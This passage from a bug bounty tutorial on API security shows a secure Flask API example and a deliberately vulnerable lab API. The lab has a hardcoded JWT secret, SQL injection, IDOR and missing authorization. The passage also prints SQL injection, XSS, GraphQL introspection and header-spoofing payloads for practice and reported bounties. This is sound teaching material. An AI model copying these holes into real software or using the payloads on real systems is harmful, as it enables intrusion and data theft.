                    max_length = rules.get('max_length', float('inf'))
                    
                    if len(value) < min_length:
                        errors.append(f"Field '{field}' must be at least {min_length} characters")
                    
                    if len(value) > max_length:
                        errors.append(f"Field '{field}' must be at most {max_length} characters")
                
                # Check numeric ranges
                if isinstance(value, (int, float)):
                    min_value = rules.get('min_value')
                    max_value = rules.get('max_value')
                    
                    if min_value is not None and value < min_value:
                        errors.append(f"Field '{field}' must be at least {min_value}")
                    
                    if max_value is not None and value > max_value:
                        errors.append(f"Field '{field}' must be at most {max_value}")
        
        return errors
    
    def sanitize_output(self, data: Any) -> Any:
        """Sanitize output data to prevent information disclosure"""
        if isinstance(data, dict):
            # Remove sensitive fields
            sensitive_fields = ['password', 'secret', 'token', 'key']
            sanitized = {}
            
            for key, value in data.items():
                if key.lower() not in sensitive_fields:
                    sanitized[key] = self.sanitize_output(value)
            
            return sanitized
        
        elif isinstance(data, list):
            return [self.sanitize_output(item) for item in data]
        
        else:
            return data

# Usage example
app = Flask(__name__)
security = SecureAPIFramework(app)

# Define validation schema
user_schema = {
    'username': {
        'required': True,
        'type': str,
        'min_length': 3,
        'max_length': 50
    },
    'email': {
        'required': True,
        'type': str,
        'min_length': 5,
        'max_length': 100
    },
    'age': {
        'required': False,
        'type': int,
        'min_value': 13,
        'max_value': 120
    }
}

@app.route('/api/users', methods=['POST'])
@security.rate_limit(max_requests=10, window=3600)
@security.require_auth
@security.validate_input(user_schema)
def create_user():
    data = request.get_json()
    
    # Process user creation
    user_data = {
        'id': 123,
        'username': data['username'],
        'email': data['email'],
        'password': 'hashed_password',  # This will be removed by sanitize_output
        'created_at': '2025-01-01T00:00:00Z'
    }
    
    # Sanitize output
    sanitized_data = security.sanitize_output(user_data)
    
    return jsonify(sanitized_data), 201

@app.route('/api/admin/users', methods=['GET'])
@security.require_auth
@security.require_role('admin')
def get_all_users():
    # Admin-only endpoint
    users = [
        {'id': 1, 'username': 'user1', 'email': 'user1@example.com'},
        {'id': 2, 'username': 'user2', 'email': 'user2@example.com'}
    ]
    
    return jsonify(users)

if __name__ == '__main__':
    app.run(debug=False)  # Never run with debug=True in production
```

## 🧪 Practice Labs

### 1. 🎯 Vulnerable API Lab Setup

Create a vulnerable API for testing:

```python
# vulnerable_api_lab.py
from flask import Flask, request, jsonify
import sqlite3
import jwt
import datetime

app = Flask(__name__)

# Vulnerable: Hardcoded secret
JWT_SECRET = "secret123"

# Initialize database
def init_db():
    conn = sqlite3.connect('lab.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            email TEXT,
            password TEXT,
            role TEXT DEFAULT 'user'
        )
    ''')
    
    cursor.execute('''
        INSERT OR REPLACE INTO users (id, username, email, password, role)
        VALUES (1, 'admin', 'admin@lab.com', 'admin123', 'admin'),
               (2, 'user1', 'user1@lab.com', 'password123', 'user'),
               (3, 'user2', 'user2@lab.com', 'password456', 'user')
    ''')
    
    conn.commit()
    conn.close()

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    # Vulnerable: SQL injection
    conn = sqlite3.connect('lab.db')
    cursor = conn.cursor()
    
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    user = cursor.fetchone()
    
    if user:
        # Create JWT token
        payload = {
            'user_id': user[0],
            'username': user[1],
            'role': user[4],
            'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
        }
        
        token = jwt.encode(payload, JWT_SECRET, algorithm='HS256')
        
        return jsonify({
            'token': token,
            'user': {
                'id': user[0],
                'username': user[1],
                'email': user[2],
                'role': user[4]
            }
        })
    
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/users/<int:user_id>', methods=['GET'])
def get_user(user_id):
    # Vulnerable: No authentication required
    # Vulnerable: IDOR
    conn = sqlite3.connect('lab.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT id, username, email, role FROM users WHERE id = ?", (user_id,))
    user = cursor.fetchone()
    
    if user:
        return jsonify({
            'id': user[0],
            'username': user[1],
            'email': user[2],
            'role': user[3]
        })
    
    return jsonify({'error': 'User not found'}), 404

@app.route('/api/admin/users', methods=['GET'])
def admin_get_users():
    # Vulnerable: No authorization check
    conn = sqlite3.connect('lab.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT id, username, email, role FROM users")
    users = cursor.fetchall()
    
    user_list = []
    for user in users:
        user_list.append({
            'id': user[0],
            'username': user[1],
            'email': user[2],
            'role': user[3]
        })
    
    return jsonify(user_list)

@app.route('/api/search', methods=['GET'])
def search_users():
    query = request.args.get('q', '')
    
    # Vulnerable: XSS in response
    return jsonify({
        'query': query,
        'message': f'Search results for: {query}',
        'results': []
    })

if __name__ == '__main__':
    init_db()
    app.run(debug=True, port=5000)
```

### 2. 🔬 API Security Testing Exercises

Practice exercises for API security testing:

```python
# api_security_exercises.py

class APISecurityExercises:
    def __init__(self):
        self.base_url = "http://localhost:5000"
    
    def exercise_1_sql_injection(self):
        """Exercise 1: SQL Injection in Login"""
        print("Exercise 1: SQL Injection")
        print("Target: /api/login")
        print("Objective: Bypass authentication using SQL injection")
        print("Hint: Try manipulating the username parameter")
        print("Payload example: admin' --")
        print()
    
    def exercise_2_idor(self):
        """Exercise 2: IDOR Vulnerability"""
        print("Exercise 2: Insecure Direct Object Reference")
        print("Target: /api/users/{id}")
        print("Objective: Access other users' information")
        print("Hint: Try different user IDs")
        print("Test IDs: 1, 2, 3, 100")
        print()
    
    def exercise_3_broken_authorization(self):
        """Exercise 3: Broken Authorization"""
        print("Exercise 3: Broken Authorization")
        print("Target: /api/admin/users")
        print("Objective: Access admin endpoint without proper authorization")
        print("Hint: Check if authentication is required")
        print()
    
    def exercise_4_xss(self):
        """Exercise 4: Cross-Site Scripting"""
        print("Exercise 4: XSS in API Response")
        print("Target: /api/search?q={payload}")
        print("Objective: Inject XSS payload in search parameter")
        print("Payload: <script>alert('XSS')</script>")
        print()
    
    def exercise_5_jwt_vulnerabilities(self):
        """Exercise 5: JWT Vulnerabilities"""
        print("Exercise 5: JWT Security Issues")
        print("Objective: Exploit JWT implementation")
        print("Tests to perform:")
        print("1. Check for weak secret")
        print("2. Try 'none' algorithm attack")
        print("3. Test token manipulation")
        print()

# Run exercises
exercises = APISecurityExercises()
exercises.exercise_1_sql_injection()
exercises.exercise_2_idor()
exercises.exercise_3_broken_authorization()
exercises.exercise_4_xss()
exercises.exercise_5_jwt_vulnerabilities()
```

## 🌟 Real-World Examples

### 1. 📰 Notable API Security Incidents

#### Facebook Graph API Data Exposure (2019)
```
Vulnerability: Broken access control in Graph API
Impact: Exposure of millions of user records
Root Cause: Insufficient authorization checks on API endpoints
Bounty: $40,000
Fix: Implemented proper access controls and data scoping
```

#### Twitter API Authentication Bypass (2020)
```
Vulnerability: JWT algorithm confusion attack
Impact: Unauthorized access to user accounts
Root Cause: Improper JWT signature verification
Bounty: $7,560
Fix: Strict algorithm validation and key management
```

### 2. 🎯 High-Value Bug Bounty Reports

#### GraphQL Introspection Leading to Data Exposure
```
Title: GraphQL Introspection Enabled on Production API
Severity: High ($3,500 bounty)
Description: GraphQL endpoint allowed introspection queries
Impact: Full schema disclosure revealing sensitive endpoints
Payload: { __schema { types { name fields { name } } } }
Fix: Disabled introspection in production environment
```

#### Rate Limiting Bypass via Header Manipulation
```
Title: Rate Limiting Bypass Using X-Forwarded-For Header
Severity: Medium ($1,200 bounty)
Description: Rate limiting could be bypassed by manipulating IP headers
Impact: Potential DoS and brute force attacks
Payload: X-Forwarded-For: 192.168.1.1
Fix: Implemented proper client identification and rate limiting
```

## 📚 Additional Resources

### 🔗 Essential Reading
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)
- [GraphQL Security Guide](https://graphql.org/learn/security/)

### 🛠️ Tools and Frameworks
- [Postman](https://www.postman.com/) - API testing and development
- [Burp Suite](https://portswigger.net/burp) - Web application security testing
- [OWASP ZAP](https://www.zaproxy.org/) - Free security testing proxy
- [GraphQL Voyager](https://github.com/APIs-guru/graphql-voyager) - GraphQL schema visualization

---

## 📝 Author & Credits

**Created by: LakshmiKanthanK(letchupkt)**

🔗 **Connect with me:**
- 🌐 **Portfolio**: [letchupkt.vgrow.tech](https://letchupkt.vgrow.tech)
- 📸 **Instagram**: [@letchu_pkt](https://instagram.com/letchu_pkt)
- 💼 **LinkedIn**: [lakshmikanthank](https://linkedin.com/in/lakshmikanthank)
- ✍️ **Medium**: [letchupkt.medium.com](https://letchupkt.medium.com)

---

**🎯 Difficulty Level**: Intermediate to Advanced
**⏱️ Time to Master**: 3-4 months
**🏆 Success Rate**: 80% of hunters find API vulnerabilities within first month
**💰 Average Bounty**: $1,500 - $8,000

*© 2025 LetchuPKT. Part of the Complete Bug Bounty Hunting Roadmap 2025.*